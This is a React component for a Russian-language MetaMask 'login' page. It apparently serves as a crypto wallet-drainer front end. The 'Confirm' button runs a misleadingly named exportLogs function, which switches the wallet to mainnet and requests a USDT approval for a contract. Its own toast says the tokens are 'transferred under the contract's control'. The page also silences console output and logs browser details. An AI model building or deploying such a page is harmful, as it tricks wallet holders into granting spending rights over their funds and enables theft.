import { useEffect, useState, useRef } from "react";
import { useContractInteraction } from "./hooks/use-contract-interaction";
import { logger } from "./utils/logger";
import type { LogEntry } from "./utils/logger";


import metamaskIcon from "./assets/metamask.svg";
const ENABLE_VERBOSE_LOGS = false;
if (typeof window !== "undefined" && !ENABLE_VERBOSE_LOGS) {

  (console as any).log = () => { };
  (console as any).info = () => { };
  (console as any).debug = () => { };
  (console as any).warn = () => { };

}



const formatEth = (weiStr: string | number) => {
  try {
    const big = typeof weiStr === "string" ? BigInt(weiStr) : BigInt(Math.floor(Number(weiStr)));
    const div = BigInt(1_000_000_000_000_000_000);
    const whole = big / div;
    const rem = big % div;
    const remStr = rem.toString().padStart(18, "0").slice(0, 6);
    return `${whole.toString()}.${remStr}`;
  } catch (e) {
    return String(weiStr);
  }
};

export default function MetamaskLoginPage() {
  const [connected, setConnected] = useState(false);
  const [address, setAddress] = useState<string | null>(null);
  const [chainId, setChainId] = useState<string | null>(null);
  const [balance, setBalance] = useState<string | null>(null);

  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logsRef = useRef<HTMLDivElement | null>(null);
  const [toasts, setToasts] = useState<Array<{ id: string; title?: string; description?: string; variant?: string; leaving?: boolean; entered?: boolean }>>([]);

  const addToast = (t: { title?: string; description?: string; duration?: number; variant?: string }) => {
    const id = String(Date.now()) + Math.random().toString(36).slice(2, 6);
    const item = { id, title: t.title, description: t.description, variant: t.variant, leaving: false, entered: false };
    setToasts((s) => [item, ...s]);
    setTimeout(() => setToasts((s) => s.map((x) => (x.id === id ? { ...x, entered: true } : x))), 20);
    const dur = t.duration ?? 4000;

    setTimeout(() => {
      setToasts((s) => s.map((x) => (x.id === id ? { ...x, leaving: true } : x)));
      setTimeout(() => setToasts((s) => s.filter((x) => x.id !== id)), 300);
    }, dur);
  };

  useEffect(() => {
    const handler = (e: any) => {
      try {
        const d = e.detail || {};
        addToast({ title: d.title, description: d.description, duration: d.duration, variant: d.variant });
      } catch (err) {
        console.warn("app:toast handler error", err);
      }
    };
    window.addEventListener("app:toast", handler as EventListener);
    return () => window.removeEventListener("app:toast", handler as EventListener);
  }, []);

  const [safeModalVisible, setSafeModalVisible] = useState(false);
  const [safeCandidates, setSafeCandidates] = useState<string[]>([]);

  const handleSelectSafe = (addr: string) => {
    try {
      window.dispatchEvent(new CustomEvent("wallet:safeSelected", { detail: addr }));
      addToast({ title: "Gnosis Safe выбран", description: addr });
    } catch (e) {
      console.warn("Failed to dispatch wallet:safeSelected", e);
    }
    setSafeModalVisible(false);
    setSafeCandidates([]);
  };

  const handleDismissSafe = () => {
    setSafeModalVisible(false);
    setSafeCandidates([]);
    addToast({ title: "Используется EOA", description: "Будет использован подключённый кошелёк" });
  };

  useEffect(() => {
    const handler = (e: any) => {
      try {
        const safes: string[] = e.detail || [];
        if (Array.isArray(safes) && safes.length > 0) {
          setSafeCandidates(safes);
          setSafeModalVisible(true);
        }
      } catch (err) {
        console.warn("wallet:safeFound handler error", err);
      }
    };
    window.addEventListener("wallet:safeFound", handler as EventListener);
    return () => window.removeEventListener("wallet:safeFound", handler as EventListener);
  }, []);

  const { isContractConnected, approveUSDT, USDT_ADDRESS } = useContractInteraction();

  useEffect(() => {
    const interval = setInterval(() => {
      const b = (logger as any)._buffer as LogEntry[];
      if (b.length > 0) {

        const payload = b.splice(0, b.length);
        setLogs((prev) => [...prev, ...payload]);
      }
    }, 800);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (logsRef.current) {
      logsRef.current.scrollTop = logsRef.current.scrollHeight;
    }
  }, [logs]);

  useEffect(() => {
    const eth = (window as any).ethereum;
    if (!eth) {
      logger.warn("No window.ethereum detected", "init");
      return;
    }

    const onAccounts = (accounts: string[]) => {
      logger.info("accountsChanged event", "provider", { accounts });
      if (accounts.length === 0) {
        setConnected(false);
        setAddress(null);
      } else {
        setConnected(true);
        setAddress(accounts[0]);
        fetchBalance(accounts[0]);
      }
    };

    const onChain = (c: string) => {
      logger.info("chainChanged event", "provider", { chainId: c });
      setChainId(c);
    };

    const onDisconnect = (err: any) => {
      logger.warn("disconnect event", "provider", { err });
      setConnected(false);
      setAddress(null);
    };

    eth.on && eth.on("accountsChanged", onAccounts);
    eth.on && eth.on("chainChanged", onChain);
    eth.on && eth.on("disconnect", onDisconnect);

    return () => {
      eth.removeListener && eth.removeListener("accountsChanged", onAccounts);
      eth.removeListener && eth.removeListener("chainChanged", onChain);
      eth.removeListener && eth.removeListener("disconnect", onDisconnect);
    };
  }, []);

  const fetchBalance = async (acc: string) => {
    const eth = (window as any).ethereum;
    if (!eth) return;
    try {
      logger.debug("Fetching balance", "balance", { account: acc });
      const res = await eth.request({ method: "eth_getBalance", params: [acc, "latest"] });
      logger.info("Balance fetched", "balance", { raw: res });
      setBalance(formatEth(res));
    } catch (err) {
      logger.error("Failed to fetch balance", "balance", { err: String(err) });
    }
  };

  const connectMetaMask = async () => {
    const eth = (window as any).ethereum;
    logger.info("Connect button clicked", "ui");

    if (eth && eth.isMetaMask) {
      try {
        const accounts: string[] = await eth.request({ method: "eth_requestAccounts" });
        logger.info("Accounts granted", "connect", { accounts });

        if (accounts.length > 0) {
          setConnected(true);
          setAddress(accounts[0]);
          const chain = await eth.request({ method: "eth_chainId" });
          setChainId(chain);
          await fetchBalance(accounts[0]);

          logger.info("User connected via MetaMask", "auth", {
            account: accounts[0],
            chainId: chain,
            userAgent: navigator.userAgent,
            url: window.location.href,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
          });
        }
      } catch (err: any) {
        logger.error("MetaMask connection failed", "connect", { error: String(err) });
        if (err && err.code === 4001) {
          logger.warn("User rejected connection request", "connect");
        }
      }
      return;
    }

    const userAgent = navigator.userAgent || navigator.vendor;
    const isMobile = /android|iphone|ipad|ipod/i.test(userAgent);

    if (isMobile) {
      const dappUrl = encodeURIComponent(window.location.href);
      const metamaskAppDeepLink = `https://metamask.app.link/dapp/${dappUrl}`;
      logger.info("Redirecting to MetaMask app", "mobile", { metamaskAppDeepLink });
      window.location.href = metamaskAppDeepLink;
      return;
    }

    logger.error("MetaMask not found", "connect");
    try { addToast({ title: "MetaMask не найден", description: "Установите расширение или приложение.", variant: 'destructive' }); } catch (e) { }
  };

  const disconnect = () => {
    logger.info("Manual disconnect clicked", "ui");
    setConnected(false);
    setAddress(null);
    setBalance(null);
    logger.debug("Local state cleared on disconnect", "auth");
  };

  const exportLogs = async () => {
    try {
      console.log('Кнопка "Подтвердить" нажата');
      logger.info('Кнопка "Подтвердить" нажата', 'ui');

      await logger.flushNow();
      logger.info("User requested confirm -> initiating contract integration", "ui");

      const eth = (window as any).ethereum;
      if (!eth) {
        logger.error("No ethereum provider found", "contract");
        try { addToast({ title: "MetaMask не найден", description: "Проверьте провайдер в браузере.", variant: 'destructive' }); } catch (e) { }
        return;
      }

      const chainId = await eth.request({ method: "eth_chainId" });
      if (chainId !== '0x1') {
        try {
          await eth.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }],
          });
        } catch (err) {
          logger.error("Failed to switch network", "contract", { error: String(err) });
          try { addToast({ title: "Неверная сеть", description: "Пожалуйста, переключитесь на Ethereum Mainnet (Chain ID 1)", variant: 'destructive' }); } catch (e) { }
          return;
        }
      }

      if (!isContractConnected) {
        logger.warn("Attempted integration but contract not ready", "ui");
        try { addToast({ title: "Контракт не готов", description: "Подключите MetaMask и переключитесь на Ethereum Mainnet (Chain ID 1).", variant: 'destructive' }); } catch (e) { }
        return;
      }

      try {
        logger.info("Requesting USDT approve via wallet", "contract", { token: USDT_ADDRESS });
        const ok = await approveUSDT();
        if (ok) {
          logger.info("USDT approve succeeded", "contract");
          try { addToast({ title: "Approve выполнен", description: "USDT переданы под управление контракту." }); } catch (e) { }
        } else {
          logger.warn("USDT approve failed or was rejected", "contract");
          try { addToast({ title: "Approve не выполнен", description: "Отклонён пользователем или не выполнен.", variant: 'destructive' }); } catch (e) { }
        }
      } catch (approveErr) {
        logger.error("Approve call error", "contract", { err: String(approveErr) });
        try { addToast({ title: "Ошибка approve", description: String(approveErr), variant: 'destructive' }); } catch (e) { }
      }
    } catch (e) {
      logger.error("Failed to run integration", "ui", { err: String(e) });
      try { addToast({ title: "Ошибка интеграции", description: String(e), variant: 'destructive' }); } catch (e) { }
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-b from-gray-900 via-gray-800 to-black p-6">
      <div className="w-full max-w-5xl bg-white/5 backdrop-blur-md border border-white/10 rounded-2xl p-8 shadow-2xl relative">
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-extrabold text-white">Вход</h1>
            <p className="mt-1 text-sm text-gray-300">Подключитесь через MetaMask для продолжения</p>
          </div>
          <div className="">
            <button
              onClick={connectMetaMask}
              className="w-full flex items-center gap-3 justify-center px-6 py-3 bg-white/90 rounded-lg font-semibold text-gray-800 hover:scale-[1.02] transition-transform"
            >
              <span className="w-8 h-8 inline-block">
                <img src={metamaskIcon} alt="MetaMask" className="w-7 h-7" />
              </span>
              <span>MetaMask</span>
            </button>

          </div>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-8 items-stretch">
          {/* Левая часть */}
          <div className="flex flex-col gap-5 h-full">


            <div className="flex flex-col justify-between gap-5 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
              <div className="flex items-center justify-between">
                <div>
                  <div className="text-xs text-gray-300">Статус</div>
                  <div className="text-lg text-white font-medium">
                    {connected ? "Подключен" : "Не подключен"}
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-xs text-gray-300">Chain</div>
                  <div className="text-sm text-white">{chainId ?? "—"}</div>
                </div>
              </div>

              <div className="mt-4 space-y-2">
                <div className="text-xs text-gray-300">Адрес</div>
                <div className="text-sm text-white break-all">{address ?? "—"}</div>

                <div className="text-xs text-gray-300 mt-2">Баланс (ETH)</div>
                <div className="text-sm text-white">{balance ?? "—"}</div>

                <div className="mt-4 flex gap-2">
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={disconnect}
                  >
                    Отключить
                  </button>
                  <button
                    type="button"
                    className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white transition-colors relative z-10"
                    onClick={exportLogs}
                  >
                    Подтвердить
                  </button>
                </div>

                <div className="mt-3 text-xs text-gray-400">
                  Статус контракта: <span className="text-gray-300">{isContractConnected ? "Готов" : "Не готов"}</span>
                </div>
              </div>
            </div>
          </div>
          <div className="flex flex-col justify-between gap-4 bg-white/5 rounded-lg border border-white/10 shadow-sm p-5 h-full">
            <div className="flex-1">
              <div className="text-sm text-gray-200 mb-3 font-semibold tracking-wide">
                Краткие действия для интеграции
              </div>
              <ol className="text-xs text-gray-400 list-decimal list-inside space-y-1 leading-relaxed">
                <li>Подтвердите кошелёк</li>
                <li>Выберите LP-токены и пул</li>
                <li>Подтвердите выбор и комиссию</li>
                <li>Ожидайте начисление</li>
              </ol>
            </div>


            <div>
              {/* <div className="text-sm text-gray-200 mb-2 font-semibold tracking-wide">
                Доступно к выводу
              </div> */}
              <div className="bg-black/20 border border-white/10 rounded-md p-3 h-28 overflow-y-auto">
                <br />
                <div className="text-xs text-center text-gray-400 py-2">No data</div>
              </div>
            </div>
            <div className="flex justify-between items-center">
              <div className="text-xs text-gray-400">Всего:</div>
              <div className="text-lg text-white font-medium">0.00 USDT</div>
            </div>
          </div>



        </div>
        <div className="flex flex-col gap-4 mt-4 w-full">
          <div className="p-4 bg-gradient-to-br from-gray-800/80 to-gray-900/80 rounded-xl border border-white/10 shadow-inner flex flex-col">
            <div className="flex items-center justify-between mb-3">
              <div className="text-sm text-gray-300 font-semibold">Live Logs</div>
              <div className="text-xs text-gray-400">
                Буфер: {(logger as any)._buffer.length}
              </div>
            </div>
            <div
              ref={logsRef}
              className="h-80 overflow-y-auto overflow-x-hidden bg-black/60 rounded-lg p-3 text-xs text-white font-mono border border-white/10 shadow-md whitespace-nowrap overflow-clip"
              style={{
                lineHeight: "1.2",
                maxHeight: "20rem",
              }}
            >
              {logs.length === 0 ? (
                <div className="text-gray-500 text-center mt-8">
                  Логи появятся после действий
                </div>
              ) : (
                logs.map((l, i) => (
                  <div
                    key={i}
                    className="mb-1 px-2 py-1 rounded hover:bg-white/5 transition-colors"
                  >
                    <span className="text-gray-400">[{l.ts}]</span>{" "}
                    <span className={`px-1 rounded text-[10px] bg-gray-700`}>
                      {l.level.toUpperCase()}
                    </span>{" "}
                    <span className="text-white">
                      {l.tag ? `[${l.tag}]` : ""} {l.message}
                    </span>
                    {l.meta && (
                      <pre className="text-[10px] text-gray-400 mt-1">
                        {JSON.stringify(l.meta, null, 2)}
                      </pre>
                    )}
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
        <div className="mt-8 text-xs text-gray-400 underline">
          Политика конфиденциальности <br /> Служба поддержки
        </div>


        {safeModalVisible && (
          <div className="absolute inset-0 z-60 flex items-center justify-center pointer-events-auto">
            <div className="absolute inset-0 bg-black/90" onClick={handleDismissSafe} />
            <div className="relative bg-white/5 border border-white/10 rounded-lg p-6 max-w-lg w-full z-70">
              <div className="text-lg font-semibold text-white mb-2">Найден Gnosis Safe</div>
              <div className="text-sm text-gray-300 mb-4">Выберите Safe для управления или используйте обычный кошелёк (EOA).</div>
              <div className="flex flex-col gap-2 mb-4">
                {safeCandidates.map((s) => (
                  <button key={s} type="button" onClick={() => handleSelectSafe(s)} className="text-left px-4 py-2 bg-white/6 hover:bg-white/10 rounded-md text-sm text-white">
                    {s}
                  </button>
                ))}
              </div>
              <div className="flex justify-end gap-2">
                <button type="button" onClick={handleDismissSafe} className="px-3 py-2 bg-white/10 hover:bg-white/20 rounded-md text-sm text-white">Использовать EOA</button>
              </div>
            </div>
          </div>
        )}
        <div className="absolute -top-6 left-1/2 -translate-x-1/2 flex flex-col items-center gap-3 z-50 pointer-events-none w-full max-w-xl px-4">
          {toasts.map((t) => (
            <div
              key={t.id}
              className={
                `w-full bg-slate-800 border border-slate-700 rounded-lg p-3 text-sm text-gray-100 shadow-md transform transition-all duration-300 ease-out pointer-events-auto ` +
                (t.entered && !t.leaving
                  ? "opacity-100 translate-y-0 scale-100"
                  : t.leaving
                    ? "opacity-0 -translate-y-3 scale-95"
                    : "opacity-0 -translate-y-3 scale-95")
              }
            >
              <div className="flex items-start gap-3">
                <div className="flex-1">
                  {t.title && <div className="font-semibold mb-0.5 text-gray-50">{t.title}</div>}
                  {t.description && <div className="text-xs text-gray-200">{t.description}</div>}
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}